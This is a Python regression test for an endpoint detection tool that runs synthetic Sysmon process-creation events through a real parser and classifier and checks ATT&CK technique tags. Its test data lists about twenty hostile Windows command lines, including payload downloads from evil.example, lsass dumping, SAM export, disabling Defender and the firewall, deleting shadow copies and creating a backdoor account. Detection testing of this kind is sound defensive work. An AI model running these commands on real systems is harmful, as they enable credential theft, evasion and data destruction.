#!/usr/bin/env python3
"""Sysmon EID 1 -> production classify pipeline (regression for the live-fire gap).

The Tier B live-fire run measured 2.9% and the first hypothesis was that the
command-line IOA rules were unreachable from the real Sysmon path. This test
disproves that at the source: it feeds a *realistic* Sysmon Operational EID 1
XML -- the exact shape ``wevtapi`` renders, named ``<Data>`` fields and all --
through the REAL production functions:

    parse_event_xml()  ->  classify_sysmon(1, data)

and asserts that every representative LOLBin/technique comes out tagged with the
right ATT&CK id (in ``technique`` or ``all_techniques``). No mocks of the
classifiers, no shortcut construction of the ``data`` dict -- the XML is parsed
by the same code the live sensor uses, so a regression in EITHER the parser or
the classifier wiring fails this test.

This is the deterministic, in-repo half of the live-fire proof: it pins that
classification works, so a future low live score points at delivery/scoring,
not at the rules.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from harness import Checks                                   # noqa: E402
from valkyrie.etw.sysmon import classify_sysmon              # noqa: E402
from valkyrie.etw.wineventlog import parse_event_xml         # noqa: E402

_EID1 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
<System>
<Provider Name='Microsoft-Windows-Sysmon' Guid='{{5770385f-c22a-43e0-bf4c-06f5698ffbd9}}'/>
<EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task>
<TimeCreated SystemTime='2026-08-11T07:10:00.000000000Z'/>
<EventRecordID>{rid}</EventRecordID>
<Execution ProcessID='4' ThreadID='8'/>
<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
<Computer>TESTHOST</Computer><Security UserID='S-1-5-18'/>
</System>
<EventData>
<Data Name='UtcTime'>2026-08-11 07:10:00.000</Data>
<Data Name='ProcessId'>{pid}</Data>
<Data Name='Image'>{image}</Data>
<Data Name='OriginalFileName'>{orig}</Data>
<Data Name='CommandLine'>{cmdline}</Data>
<Data Name='CurrentDirectory'>C:\\Windows\\system32\\</Data>
<Data Name='User'>TESTHOST\\Administrator</Data>
<Data Name='IntegrityLevel'>High</Data>
<Data Name='Hashes'>SHA256=ABC123</Data>
<Data Name='ParentProcessId'>{ppid}</Data>
<Data Name='ParentImage'>{parent}</Data>
<Data Name='ParentCommandLine'>{parent_cmd}</Data>
</EventData>
</Event>"""


def _eid1_xml(image, cmdline, parent=r"C:\Windows\System32\cmd.exe",
              parent_cmd="cmd.exe /c x", rid=1000, pid=5000, ppid=4000, orig="x.exe"):
    return _EID1.format(image=image, cmdline=cmdline, parent=parent,
                        parent_cmd=parent_cmd, rid=rid, pid=pid, ppid=ppid, orig=orig)


# (label, image, cmdline, expected ATT&CK id substring). One representative,
# realistic invocation per technique -- the behavioral SHAPE, never a test name.
CASES = [
    ("regsvr32-squiblydoo", r"C:\Windows\System32\regsvr32.exe",
     r"regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll", "T1218.010"),
    ("rundll32-proxy", r"C:\Windows\System32\rundll32.exe",
     r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("x")', "T1218.011"),
    ("mshta-remote", r"C:\Windows\System32\mshta.exe",
     r"mshta.exe http://evil.example/a.hta", "T1218.005"),
    ("wmic-process-call", r"C:\Windows\System32\wbem\WMIC.exe",
     r"wmic.exe process call create calc.exe", "T1047"),
    ("certutil-download", r"C:\Windows\System32\certutil.exe",
     r"certutil.exe -urlcache -split -f http://evil.example/a.exe a.exe", "T1105"),
    ("certutil-decode", r"C:\Windows\System32\certutil.exe",
     r"certutil.exe -decode a.b64 a.exe", "T1140"),
    ("clear-eventlog", r"C:\Windows\System32\wevtutil.exe",
     r"wevtutil.exe cl Security", "T1070.001"),
    ("firewall-disable", r"C:\Windows\System32\netsh.exe",
     r"netsh.exe advfirewall set allprofiles state off", "T1562.004"),
    ("defender-disable",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     r"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", "T1562.001"),
    ("reg-save-sam", r"C:\Windows\System32\reg.exe",
     r"reg.exe save hklm\sam sam.hive", "T1003.002"),
    ("comsvcs-minidump", r"C:\Windows\System32\rundll32.exe",
     r"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 640 lsass.dmp full", "T1003.001"),
    ("nltest-domain-trust", r"C:\Windows\System32\nltest.exe",
     r"nltest.exe /domain_trusts /all_trusts", "T1482"),
    ("vssadmin-delete", r"C:\Windows\System32\vssadmin.exe",
     r"vssadmin.exe delete shadows /all /quiet", "T1490"),
    ("schtasks-create", r"C:\Windows\System32\schtasks.exe",
     r"schtasks.exe /create /tn evil /tr calc.exe /sc onlogon", "T1053.005"),
    ("reg-add-runkey", r"C:\Windows\System32\reg.exe",
     r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v e /d calc.exe", "T1547.001"),
    ("wmic-remote-node", r"C:\Windows\System32\wbem\WMIC.exe",
     r"wmic.exe /node:10.0.0.5 process call create calc.exe", "T1047"),
    ("net-user-add", r"C:\Windows\System32\net.exe",
     r"net.exe user backdoor P@ssw0rd123! /add", "T1136.001"),
    ("encoded-powershell",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     r"powershell.exe -nop -w hidden -enc SQBFAFgAKAAn", "T1059.001"),
    ("whoami-priv", r"C:\Windows\System32\whoami.exe",
     r"whoami.exe /priv", "T1033"),
    ("service-stop-security", r"C:\Windows\System32\sc.exe",
     r"sc.exe stop WinDefend", "T1489"),
]


def _techniques(result: dict) -> str:
    """All ATT&CK ids the classifier attached, as one searchable string."""
    if result is None:
        return ""
    parts = [str(result.get("technique") or "")]
    parts += [str(t) for t in (result.get("all_techniques") or [])]
    return " ".join(parts)


def main() -> int:
    c = Checks("Sysmon EID1 -> classify pipeline (real XML path)",
               expect_min=len(CASES) + 2)

    # [1] Every technique classified correctly through the real parse path.
    rid = 1000
    for label, image, cmdline, expect in CASES:
        rid += 1
        ev = parse_event_xml(_eid1_xml(image, cmdline, rid=rid))
        if ev.get("event_id") != 1:
            c.check(f"{label}: parses as EID 1", False)
            continue
        got = _techniques(classify_sysmon(1, ev.get("data", {})))
        c.check(f"{label} -> {expect} (got '{got or 'None'}')", expect in got)

    # [2] The command line - the field the whole IOA layer keys off - survives.
    data = parse_event_xml(_eid1_xml(
        r"C:\Windows\System32\regsvr32.exe",
        r"regsvr32.exe /i:http://x/y.sct scrobj.dll")).get("data", {})
    c.check("EID1 parse preserves CommandLine + Image",
            data.get("CommandLine", "").startswith("regsvr32.exe /i:http")
            and data.get("Image", "").endswith("regsvr32.exe"))

    # [3] Benign signed system process stays quiet (false-positive floor).
    benign = classify_sysmon(1, parse_event_xml(_eid1_xml(
        r"C:\Windows\System32\svchost.exe", r"svchost.exe -k netsvcs -p",
        parent=r"C:\Windows\System32\services.exe",
        parent_cmd="services.exe")).get("data", {}))
    c.check("benign svchost gets no attack technique",
            benign is None or not (benign.get("technique") or "").strip())

    return c.finish()


if __name__ == "__main__":
    raise SystemExit(main())
